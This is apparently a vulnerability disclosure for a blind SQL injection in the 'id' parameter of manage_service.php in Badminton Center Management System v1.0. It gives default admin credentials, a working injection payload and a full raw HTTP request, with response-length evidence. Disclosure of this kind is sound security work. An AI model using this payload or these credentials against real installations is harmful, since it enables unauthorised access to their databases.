# Badminton Center Management System v1.0 by oretnom23 has SQL injection

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/15318/badminton-center-management-system-phpoop-free-source-code.html

Current database name: bcms_db,length is 7

Vulnerability File:  /bcms/admin/services/manage_service.php?id=

Vulnerability location:  /bcms/admin/services/manage_service.php?id=,id

[+] Payload: /bcms/admin/services/manage_service.php?id=2%27%20and%20length(database())%20=7--+ // Leak place ---> id

```sql
GET /bcms/admin/services/manage_service.php?id=2%27%20and%20length(database())%20=7--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=qq2e8htekg3g2rkgtbq38p0jnv
Connection: close
```

When length (database ()) = 6, Content-Length: 847
![image](https://user-images.githubusercontent.com/54017627/170621884-cf4c17da-5c51-4a8d-a522-5c87d9947a4a.png)

![image](https://user-images.githubusercontent.com/54017627/170621822-f2797b98-f890-4fbe-9a99-ce5736fba88e.png)

When length (database ()) = 7, Content-Length: 2204
![image](https://user-images.githubusercontent.com/54017627/170621863-56b8b7f7-5d2e-493a-81e7-45b88332b4a7.png)

![image](https://user-images.githubusercontent.com/54017627/170621799-f60fd9b6-fa17-4ad8-9567-f2986f63b0d2.png)
